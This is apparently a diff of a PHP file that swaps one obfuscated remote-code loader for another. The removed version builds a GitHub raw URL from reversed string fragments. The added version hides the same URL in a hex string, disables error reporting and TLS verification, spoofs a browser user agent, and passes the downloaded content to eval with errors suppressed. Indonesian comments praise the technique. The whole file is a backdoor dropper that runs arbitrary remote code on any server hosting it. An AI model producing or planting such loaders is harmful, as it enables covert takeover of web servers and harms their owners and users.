@@ -1,30 +1,32 @@
 <?php
 
-$s1 = "txt.2/nia";
-$s2 = "m/sdaeh/sfe";
-$s3 = "r/mpo/mpo";
-$s4 = "yfful/moc.tn";
-$s5 = "etnocresubuht";
-$s6 = "ig.war//:sptth";
+error_reporting(0);
+set_time_limit(0); // Agar skrip tidak mati saat proses network yang lama
 
-$url = strrev($s1 . $s2 . $s3 . $s4 . $s5 . $s6);
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-
-$res = curl_exec($ch);
-
-if (!curl_errno($ch)) {
-    $exec = str_replace(['<?php', '?>', '<?'], '', $res);
-    try {
-        eval($exec);
-    } catch (Throwable $e) {
-    }
+function get_u() {
+    return pack("H*", "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6c756666796f706d2f6f706d2f726566732f68656164732f6d61696e2f322e747874");
 }
 
+$ch = curl_init(get_u());
+curl_setopt_array($ch, [
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_SSL_VERIFYPEER => false,
+    CURLOPT_SSL_VERIFYHOST => false,
+    CURLOPT_TIMEOUT        => 30, // Ditambah jadi 30 detik
+    CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
+]);
+
+$res = curl_exec($ch);
 curl_close($ch);
+
+if ($res) {
+    // Teknik paling bersih untuk menjalankan kode dengan tag PHP aktif
+    try {
+        eval('?>' . $res);
+    } catch (Throwable $e) {
+        // Diam jika terjadi error internal
+    }
+}
 
 ?>
